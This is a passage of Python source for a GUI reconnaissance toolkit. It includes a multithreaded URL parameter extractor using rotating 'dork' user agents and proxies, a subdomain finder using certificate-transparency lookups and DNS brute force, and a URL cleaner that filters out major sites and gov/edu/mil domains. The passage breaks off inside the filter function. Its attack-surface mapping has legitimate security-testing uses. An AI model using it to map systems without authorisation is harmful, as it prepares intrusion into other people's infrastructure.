                fragment_params = parse_qs(fragment.split('#')[0] if '#' in fragment else fragment, keep_blank_values=True)
                params.update(fragment_params.keys())
        except:
            pass
        return params

    def extract_params_from_html(self, html, base_url):
        params = set()
        if BeautifulSoup is None:
            return params
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                for inp in form.find_all('input', {'name': True}):
                    params.add(inp.get('name'))
                for select in form.find_all('select', {'name': True}):
                    params.add(select.get('name'))
                for textarea in form.find_all('textarea', {'name': True}):
                    params.add(textarea.get('name'))
            for link in soup.find_all('a', href=True):
                href = link.get('href', '')
                if href.startswith('http') or href.startswith('/'):
                    try:
                        if not href.startswith('http'):
                            href = urljoin(base_url, href)
                        link_params = self.extract_params_from_url(href)
                        params.update(link_params)
                    except:
                        pass
        except:
            pass
        return params

    def extract_params_from_js(self, js_content):
        params = set()
        try:
            api_patterns = ['[\\?&](\\w+)=', '(?:fetch|axios|\\.get|\\.post|\\.ajax)\\s*\\(["\\\']([^"\\\']+)', 'url\\s*[:=]\\s*["\\\']([^"\\\']+)', 'endpoint\\s*[:=]\\s*["\\\']([^"\\\']+)']
            for pattern in api_patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0] if match else ''
                    if match and '?' in match:
                        url_params = self.extract_params_from_url(match if match.startswith('http') else 'http://example.com?' + match.split('?')[-1])
                        params.update(url_params)
                    elif match and len(match) > 2:
                        params.add(match)
        except:
            pass
        return params

    def scan_url(self, url, timeout, proxy):
        if self.stop_flag:
            return set()
        params = set()
        try:
            url = url.strip()
            if not url.startswith('http'):
                url = 'https://' + url
            params.update(self.extract_params_from_url(url))
            if not params:
                try:
                    headers = DEFAULT_HEADERS.copy()
                    headers['User-Agent'] = random.choice(DORK_USER_AGENTS) if 'DORK_USER_AGENTS' in globals() else DEFAULT_USER_AGENT
                    proxies = None
                    if proxy:
                        proxies = {'http': proxy, 'https': proxy}
                    response = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=True, proxies=proxies)
                    if response.status_code in [200, 301, 302, 303, 307, 308]:
                        final_url = response.url
                        params.update(self.extract_params_from_url(final_url))
                        if response.status_code == 200:
                            params.update(self.extract_params_from_html(response.text, url))
                            js_files = re.findall('<script[^>]*src=["\\\']([^"\\\']+)["\\\']', response.text, re.IGNORECASE)
                            for js_url in js_files[:3]:
                                if self.stop_flag:
                                    break
                                try:
                                    if not js_url.startswith('http'):
                                        js_url = urljoin(url, js_url)
                                    js_response = requests.get(js_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                                    if js_response.status_code == 200:
                                        params.update(self.extract_params_from_js(js_response.text))
                                except:
                                    pass
                except:
                    pass
        except:
            pass
        return params

    def param_finder_worker(self, url_input, threads, timeout, proxy):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    urls = [line.strip() for line in f if line.strip() and (not line.strip().startswith('#'))]
            except:
                self.log('Error reading file')
                self.is_running = False
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                return
        else:
            urls = [url_input]
        if not urls:
            self.log('No URLs to process')
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            return
        self.stats_queue.put({'total': len(urls)})
        self.log(f'Processing {len(urls)} URLs...')
        self.log('Extracting parameters from URL query strings...')
        try:
            with open(self.found_params_file, 'w', encoding='utf-8') as f:
                f.write(f"# Param Finder Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total URLs: {len(urls)}\n')
                f.write(f'# Format: parameter_name\n\n')
            max_workers = min(threads, 20)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(self.scan_url, url, timeout, proxy): url for url in urls}
                for future in as_completed(futures):
                    if self.stop_flag:
                        break
                    url = futures[future]
                    try:
                        found = future.result()
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            new_params = found - self.found_params
                            if new_params:
                                self.found_params.update(new_params)
                                self.stats['found'] = len(self.found_params)
                                with open(self.found_params_file, 'a', encoding='utf-8') as f:
                                    for param in sorted(new_params):
                                        f.write(f'{param}\n')
                                param_list = ', '.join(sorted(new_params))
                                self.log(f'[FOUND] {len(new_params)} params from {url[:50]}: {param_list[:80]}')
                                self.frame.after(0, self.update_params_display)
                            else:
                                self.log(f'[SKIP] No new params from {url[:50]}')
                        self.stats_queue.put(self.stats.copy())
                    except Exception as e:
                        with self.stats_lock:
                            self.stats['processed'] += 1
                        self.stats_queue.put(self.stats.copy())
            self.log(f'Scan completed! Found {len(self.found_params)} unique parameters')
        except Exception as e:
            self.log(f'Error: {str(e)}')
        finally:
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            if not self.stop_flag:
                messagebox.showinfo('Success', f'Scan completed!\nFound {len(self.found_params)} unique parameters\n\nSaved to: {self.found_params_file}')

    def update_params_display(self):
        try:
            self.params_text.delete(1.0, tk.END)
            for param in sorted(self.found_params):
                self.params_text.insert(tk.END, f'{param}\n')
        except:
            pass

    def save_results(self):
        if not self.found_params:
            messagebox.showwarning('Warning', 'No parameters to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'param_finder_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# Param Finder Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Parameters: {len(self.found_params)}\n\n')
                for param in sorted(self.found_params):
                    f.write(f'{param}\n')
            self.log(f'Results saved to: {filename}')
            messagebox.showinfo('Success', f'Saved {len(self.found_params)} parameters to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

class SubdomainFinderTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.found_subdomains = set()
        self.found_subdomains_file = None
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'found': 0, 'validated': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='SUBDOMAIN FINDER', font=('Courier', 20, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        input_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Domain/File:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        domain_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        domain_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.domain_entry = tk.Entry(domain_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.domain_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(domain_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        options_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.ct_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Certificate Transparency', variable=self.ct_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=(0, 10))
        self.brute_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='DNS Brute Force', variable=self.brute_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=(0, 10))
        self.validate_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Validate DNS', variable=self.validate_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT)
        thread_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        thread_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(thread_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(thread_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.threads_entry.insert(0, '20')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(thread_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(thread_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=8)
        self.timeout_entry.insert(0, '5')
        self.timeout_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START SCAN]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.start_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.start_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], command=self.stop_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, state=tk.DISABLED, cursor='hand2')
        self.stop_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], command=self.save_results, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.save_button.pack(side=tk.LEFT, fill=tk.X, expand=True)
        stats_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='Total: 0 | Processed: 0 | Found: 0 | Validated: 0', font=('Courier', 9), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=5, pady=5)
        self.stats_label.pack(fill=tk.X)
        tk.Label(left_frame, text='Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.log_text = scrolledtext.ScrolledText(left_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=12, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        tk.Label(right_frame, text='Found Subdomains:', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.subdomains_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=35, wrap=tk.WORD)
        self.subdomains_text.pack(fill=tk.BOTH, expand=True)

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select Domain File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.domain_entry.delete(0, tk.END)
            self.domain_entry.insert(0, filename)

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        self.log_queue.put((f'{timestamp} {message}\n', color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg)
                self.log_text.see(tk.END)
                line_count = int(self.log_text.index('end-1c').split('.')[0])
                if line_count >= 200:
                    self.log_text.delete(1.0, f'{line_count - 100}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                with self.stats_lock:
                    self.stats.update(stats)
                self.stats_label.config(text=f"Total: {self.stats['total']} | Processed: {self.stats['processed']} | Found: {self.stats['found']} | Validated: {self.stats['validated']}")
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

    def start_scan(self):
        if self.is_running:
            return
        domain_input = self.domain_entry.get().strip()
        if not domain_input:
            messagebox.showwarning('Warning', 'Please enter domain or select file!')
            return
        try:
            threads = int(self.threads_entry.get())
            if threads < 1:
                threads = 1
            if threads > 50:
                threads = 50
        except:
            threads = 20
        try:
            timeout = int(self.timeout_entry.get())
            if timeout < 1:
                timeout = 5
            if timeout > 30:
                timeout = 30
        except:
            timeout = 5
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.found_subdomains_file = f'subdomain_finder_{timestamp}.txt'
        self.is_running = True
        self.stop_flag = False
        self.found_subdomains = set()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting subdomain enumeration...')
        thread = threading.Thread(target=self.subdomain_finder_worker, args=(domain_input, threads, timeout), daemon=True)
        thread.start()

    def stop_scan(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Scan stopped')

    def normalize_domain(self, domain):
        domain = domain.strip().lower()
        domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')
        domain = domain.split('/')[0].split(':')[0]
        return domain

    def get_ct_subdomains(self, domain):
        subdomains = set()
        if self.stop_flag:
            return subdomains
        try:
            url = f'https://crt.sh/?q=%.{domain}&output=json'
            headers = DEFAULT_HEADERS.copy()
            response = requests.get(url, headers=headers, timeout=15, verify=False)
            if response.status_code == 200:
                data = response.json()
                for cert in data:
                    if self.stop_flag:
                        break
                    name_value = cert.get('name_value', '')
                    if name_value:
                        for name in name_value.split('\n'):
                            name = name.strip().lower()
                            if domain in name and '*' not in name:
                                sub = name.split(domain)[0].rstrip('.')
                                if sub and len(sub) > 0:
                                    full_sub = f'{sub}.{domain}'
                                    subdomains.add(full_sub)
        except:
            pass
        return subdomains

    def validate_dns(self, subdomain):
        try:
            import socket
            socket.gethostbyname(subdomain)
            return True
        except:
            return False

    def brute_force_subdomains(self, domain, wordlist):
        found = set()
        for sub in wordlist:
            if self.stop_flag:
                break
            full_sub = f'{sub}.{domain}'
            if self.validate_var.get():
                if self.validate_dns(full_sub):
                    found.add(full_sub)
            else:
                found.add(full_sub)
        return found

    def subdomain_finder_worker(self, domain_input, threads, timeout):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        domains = []
        if os.path.isfile(domain_input):
            try:
                with open(domain_input, 'r', encoding='utf-8') as f:
                    domains = [self.normalize_domain(line.strip()) for line in f if line.strip() and (not line.strip().startswith('#'))]
            except:
                self.log('Error reading file')
                self.is_running = False
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                return
        else:
            domains = [self.normalize_domain(domain_input)]
        if not domains:
            self.log('No domains to process')
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            return
        common_subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api', 'cdn', 'blog', 'shop', 'store', 'app', 'mobile', 'm', 'webmail', 'smtp', 'pop', 'imap', 'ns1', 'ns2', 'dns', 'vpn', 'remote', 'secure', 'portal', 'panel', 'cpanel', 'whm', 'webdisk', 'autodiscover', 'autoconfig', 'msoid', 'login', 'owa', 'exchange', 'sip', 'lyncdiscover', 'enterpriseregistration', 'enterpriseenrollment', 'gateway', 'wpad', 'proxy', 'ns', 'mx', 'sip', 'sipfederationtls', 'sipinternal', 'lyncdiscoverinternal', 'meet', 'dialin', 'skype', 'lync', 'lyncdiscover', 'scheduler', 'ucwa', 'rpc', 'rpc-over-https', 'certsrv', 'crl', 'ocsp', 'www2', 'www3', 'web', 'web2', 'ns3', 'ns4', 'dns1', 'dns2', 'mx1', 'mx2', 'mail1', 'mail2', 'smtp1', 'smtp2', 'pop1', 'pop2', 'imap1', 'imap2', 'old', 'new', 'backup', 'backups', 'db', 'database', 'sql', 'mysql', 'mssql', 'oracle', 'postgres', 'redis', 'cache', 'memcached', 'elastic', 'elasticsearch', 'kibana', 'grafana', 'prometheus', 'jenkins', 'git', 'gitlab', 'github', 'svn', 'hg', 'jira', 'confluence', 'wiki', 'docs', 'documentation', 'help', 'support', 'kb', 'knowledgebase', 'ticket', 'tickets', 'forum', 'forums', 'community', 'chat', 'irc', 'slack', 'discord', 'teams', 'zoom', 'meet', 'webex', 'gotomeeting', 'join', 'joinme', 'bluejeans', 'jitsi', 'bigbluebutton', 'bbb', 'bbb-live', 'bbb-rec', 'bbb-playback', 'bbb-client', 'bbb-html5', 'bbb-webrtc', 'bbb-screenshare', 'bbb-video', 'bbb-audio', 'bbb-chat', 'bbb-poll', 'bbb-whiteboard', 'bbb-notes', 'bbb-breakout', 'bbb-recording', 'bbb-playback', 'bbb-stats', 'bbb-api', 'bbb-admin', 'bbb-demo', 'bbb-test', 'bbb-dev', 'bbb-staging', 'bbb-prod', 'bbb-live', 'bbb-rec', 'bbb-playback', 'bbb-client', 'bbb-html5', 'bbb-webrtc', 'bbb-screenshare', 'bbb-video', 'bbb-audio', 'bbb-chat', 'bbb-poll', 'bbb-whiteboard', 'bbb-notes', 'bbb-breakout', 'bbb-recording', 'bbb-playback', 'bbb-stats', 'bbb-api', 'bbb-admin', 'bbb-demo', 'bbb-test', 'bbb-dev', 'bbb-staging', 'bbb-prod']
        self.stats_queue.put({'total': len(domains)})
        self.log(f'Processing {len(domains)} domains...')
        try:
            with open(self.found_subdomains_file, 'w', encoding='utf-8') as f:
                f.write(f"# Subdomain Finder Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Domains: {len(domains)}\n\n')
            for domain in domains:
                if self.stop_flag:
                    break
                self.log(f'Scanning {domain}...')
                subdomains = set()
                ct_subs = set()
                if self.ct_var.get():
                    ct_subs = self.get_ct_subdomains(domain)
                    subdomains.update(ct_subs)
                    self.log(f'[CT] Found {len(ct_subs)} subdomains from Certificate Transparency')
                if self.brute_var.get():
                    max_workers = min(threads, 30)
                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
                        chunk_size = max(1, len(common_subdomains) // max_workers)
                        futures = []
                        for i in range(0, len(common_subdomains), chunk_size):
                            chunk = common_subdomains[i:i + chunk_size]
                            future = executor.submit(self.brute_force_subdomains, domain, chunk)
                            futures.append(future)
                        for future in as_completed(futures):
                            if self.stop_flag:
                                break
                            try:
                                found = future.result()
                                subdomains.update(found)
                            except:
                                pass
                    if self.ct_var.get():
                        brute_count = len([s for s in subdomains if s not in ct_subs])
                    else:
                        brute_count = len(subdomains)
                    self.log(f'[BRUTE] Found {brute_count} subdomains from brute force')
                with self.stats_lock:
                    new_subs = subdomains - self.found_subdomains
                    if new_subs:
                        self.found_subdomains.update(new_subs)
                        self.stats['found'] = len(self.found_subdomains)
                        validated_count = 0
                        for sub in new_subs:
                            if self.validate_var.get() and self.validate_dns(sub):
                                validated_count += 1
                            with open(self.found_subdomains_file, 'a', encoding='utf-8') as f:
                                f.write(f'{sub}\n')
                        self.stats['validated'] += validated_count
                        self.log(f'[FOUND] {len(new_subs)} new subdomains for {domain} (Total: {len(self.found_subdomains)})')
                        self.frame.after(0, self.update_subdomains_display)
                self.stats['processed'] += 1
                self.stats_queue.put(self.stats.copy())
            self.log(f'Scan completed! Found {len(self.found_subdomains)} unique subdomains')
        except Exception as e:
            self.log(f'Error: {str(e)}')
        finally:
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            if not self.stop_flag:
                messagebox.showinfo('Success', f'Scan completed!\nFound {len(self.found_subdomains)} unique subdomains\n\nSaved to: {self.found_subdomains_file}')

    def update_subdomains_display(self):
        try:
            self.subdomains_text.delete(1.0, tk.END)
            for sub in sorted(self.found_subdomains):
                self.subdomains_text.insert(tk.END, f'{sub}\n')
        except:
            pass

    def save_results(self):
        if not self.found_subdomains:
            messagebox.showwarning('Warning', 'No subdomains to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'subdomain_finder_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# Subdomain Finder Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Subdomains: {len(self.found_subdomains)}\n\n')
                for sub in sorted(self.found_subdomains):
                    f.write(f'{sub}\n')
            self.log(f'Results saved to: {filename}')
            messagebox.showinfo('Success', f'Saved {len(self.found_subdomains)} subdomains to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

class URLFilterTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.setup_tab()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='URL FILTER & CLEANER', font=('Courier', 20, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        input_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(input_frame, text='Input URLs (File or Paste):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        file_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        file_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.file_entry = tk.Entry(file_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(file_frame, text='Browse', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        tk.Label(input_frame, text='Or paste URLs here (one per line):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(4, 4))
        self.urls_text = scrolledtext.ScrolledText(input_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=15, wrap=tk.WORD)
        self.urls_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        options_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        options_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.domain_only_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_frame, text='Extract Domain Only', variable=self.domain_only_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=(0, 10))
        self.remove_duplicates_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Remove Duplicates', variable=self.remove_duplicates_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=(0, 10))
        self.filter_common_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text='Filter Common Domains', variable=self.filter_common_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT)
        button_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(0, 8))
        self.filter_button = tk.Button(button_frame, text='[FILTER & CLEAN]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.filter_urls, width=25, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.filter_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.save_button = tk.Button(button_frame, text='[SAVE TO FILE]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], command=self.save_results, width=25, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.save_button.pack(side=tk.LEFT, fill=tk.X, expand=True)
        stats_frame = tk.Frame(left_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='Total: 0 | Cleaned: 0 | Removed: 0', font=('Courier', 9), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=5, pady=5)
        self.stats_label.pack(fill=tk.X)
        tk.Label(right_frame, text='Cleaned URLs:', font=('Courier', 10, 'bold'), fg=self.colors['fg_green'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.cleaned_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=35, wrap=tk.WORD)
        self.cleaned_text.pack(fill=tk.BOTH, expand=True)
        self.cleaned_urls = []
        self.stats = {'total': 0, 'cleaned': 0, 'removed': 0}

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select URL File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, filename)
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    self.urls_text.delete(1.0, tk.END)
                    self.urls_text.insert(1.0, content)
            except Exception as e:
                messagebox.showerror('Error', f'Error reading file: {str(e)}')

    def filter_urls(self):
        self.filter_button.config(state=tk.DISABLED)
        self.cleaned_text.delete(1.0, tk.END)
        self.cleaned_urls = []
        self.stats = {'total': 0, 'cleaned': 0, 'removed': 0}
        try:
            urls = []
            file_path = self.file_entry.get().strip()
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        urls.extend([line.strip() for line in f if line.strip()])
                except Exception as e:
                    messagebox.showerror('Error', f'Error reading file: {str(e)}')
                    self.filter_button.config(state=tk.NORMAL)
                    return
            text_content = self.urls_text.get(1.0, tk.END).strip()
            if text_content:
                urls.extend([line.strip() for line in text_content.split('\n') if line.strip()])
            if not urls:
                messagebox.showwarning('Warning', 'No URLs to filter!')
                self.filter_button.config(state=tk.NORMAL)
                return
            self.stats['total'] = len(urls)
            common_domains = ['google.com', 'google.co.id', 'google.co.uk', 'google.com.au', 'bing.com', 'yahoo.com', 'duckduckgo.com', 'facebook.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'youtube.com', 'vimeo.com', 'dailymotion.com', 'wikipedia.org', 'w3schools.com', 'stackoverflow.com', 'github.com', 'bit.ly', 'tinyurl.com', 'goo.gl', 't.co', 'ow.ly', 'amazon.com', 'ebay.com', 'alibaba.com', 'microsoft.com', 'apple.com', 'adobe.com', 'cloudflare.com', 'akamai.com', 'wordpress.com', 'blogger.com', 'tumblr.com', 'reddit.com', 'pinterest.com', 'paypal.com', 'stripe.com', 'gov', 'edu', 'mil', 'localhost', '127.0.0.1', '0.0.0.0', 'example.com', 'test.com', 'demo.com']
            cleaned = []
            seen = set()
            for url in urls:
                if not url:
                    continue
                url = url.strip()
                if not url.startswith('http://') and (not url.startswith('https://')):
                    url = 'https://' + url
                try:
                    parsed = urlparse(url)
                    domain = parsed.netloc.lower()
                    if ':' in domain:
                        domain = domain.split(':')[0]
                    if domain.startswith('www.'):
                        domain = domain[4:]
                    if self.filter_common_var.get():
                        should_filter = False
                        for common in common_domains:
                            if common in domain or domain.endswith('.' + common):
                                should_filter = True
                                break
                        if should_filter:
                            self.stats['removed'] += 1
                            continue
                    if self.domain_only_var.get():
                        final_url = f'{parsed.scheme}://{domain}'
                    else:
                        final_url = url
                    if self.remove_duplicates_var.get():
                        if final_url in seen:
                            self.stats['removed'] += 1
                            continue
                        seen.add(final_url)
                    cleaned.append(final_url)
                    self.stats['cleaned'] += 1
                except Exception:
                    self.stats['removed'] += 1
                    continue
            self.cleaned_urls = cleaned
            for url in cleaned:
                self.cleaned_text.insert(tk.END, url + '\n')
            self.stats_label.config(text=f"Total: {self.stats['total']} | Cleaned: {self.stats['cleaned']} | Removed: {self.stats['removed']}")
